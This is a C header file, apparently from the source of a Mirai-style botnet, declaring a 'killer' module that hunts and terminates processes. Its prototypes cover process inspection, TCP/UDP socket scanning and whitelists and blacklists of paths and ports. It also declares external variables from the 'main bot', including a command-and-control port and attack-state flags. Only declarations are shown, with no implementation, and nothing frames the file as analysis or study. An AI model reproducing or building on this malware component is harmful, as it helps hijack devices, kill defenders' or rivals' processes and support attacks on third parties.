#ifndef KILLER_H
#define KILLER_H

#include <sys/types.h>

// Killer configuration
#define KILLER_INTERVAL 3
#define MAX_WHITELISTED_PORTS 20
#define MAX_BLACKLISTED_PATHS 50

// External variables from main bot (declared as extern)
extern int main_pid;
extern int watcher_pid;
extern int attack_ongoing[];
extern int cnc_port;
extern volatile int attack_active;

// Killer functions
void killer_main(void);
void killer_stat(void);
void killer_exe(void);
void killer_ps(void);
void killer_maps(void);
void killer_tcp(void);
void killer_udp(void);
void killer_scan(void);

// Utility functions
int is_whitelisted(pid_t pid, const char *cmdline, const char *exe, const char *maps);
int is_blacklisted(const char *cmdline, const char *exe, const char *maps);
int is_whitelisted_port(int port);
pid_t find_pid_by_inode(unsigned int inode);

#endif
